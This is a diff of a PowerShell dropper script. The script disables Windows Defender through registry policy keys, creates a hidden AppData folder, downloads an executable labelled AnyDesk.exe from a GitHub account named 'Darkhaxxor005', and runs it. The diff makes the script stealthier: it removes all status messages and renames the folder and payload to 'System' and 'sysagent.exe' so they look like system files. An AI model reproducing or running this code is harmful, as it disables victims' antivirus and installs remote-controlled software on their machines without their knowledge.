@@ -1,5 +1,4 @@
 # Disable Windows Defender via Registry
-Write-Host "Disabling Windows Defender..."
 
 # Disable AntiSpyware (Windows Defender)
 $DefenderRegistryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
@@ -21,12 +20,12 @@ if (-not (Test-Path $RealTimeProtectionRegistryKey)) {
 }
 Set-ItemProperty -Path $RealTimeProtectionRegistryKey -Name $DisableRealTimeMonitoring -Value $Value
 
-Write-Host "Windows Defender Disabled. A restart may be required."
+
 
 # Create hidden folder in AppData and download .exe file
-Write-Host "Creating hidden folder 'Test' in AppData..."
 
-$AppDataPath = "$env:APPDATA\Test"
+
+$AppDataPath = "$env:APPDATA\System"
 
 # Check if the directory exists; if not, create it
 if (-not (Test-Path $AppDataPath)) {
@@ -38,14 +37,11 @@ Set-ItemProperty -Path $AppDataPath -Name Attributes -Value ([System.IO.FileAttr
 
 # Define the URL of the .exe file and the destination path
 $exeUrl = "https://github.com/Darkhaxxor005/host/raw/refs/heads/main/AnyDesk.exe"  # Replace with the actual URL of the .exe
-$exePath = "$AppDataPath\gggg.exe"
+$exePath = "$AppDataPath\sysagent.exe"
 
 # Download the .exe file
-Write-Host "Downloading .exe file..."
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
 # Execute the downloaded .exe file
-Write-Host "Executing the .exe file..."
 Start-Process -FilePath $exePath
 
-Write-Host "Task completed."
